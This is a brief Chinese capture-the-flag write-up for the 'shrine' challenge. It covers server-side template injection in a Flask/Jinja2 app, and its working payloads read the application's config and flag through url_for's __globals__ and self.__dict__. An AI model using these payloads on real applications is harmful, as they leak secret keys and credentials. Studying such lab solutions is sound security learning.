# 攻防世界 shrine(难度3) SSTI

## 思路

- 这个题，我看出来是SSTI，但是试了半天，不知道如何获取配置文件

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682040760277-a6d37d9b-6aa0-44ee-8cc0-f29bb5a2bb48.png#averageHue=%23fdfafa&clientId=ub8272dd9-67b2-4&from=paste&height=166&id=udd8c6ed0&originHeight=332&originWidth=1116&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31440&status=done&style=none&taskId=u46e42df5-75dd-4b5f-b547-4e061fbfd6d&title=&width=558)

- 这里是把**变量名**为config的置为None

## wp

- 通过`__globals__`获取`app`，再获取配置文件

```python
{{url_for.__globals__['current_app'].config['FLAG']}}
```

## 总结

模板获取配置文件有3种方式

1. `{{self.__dict__}}`
2. `config`
3. `{{url_for.__globals__['current_app'].config['FLAG']}}`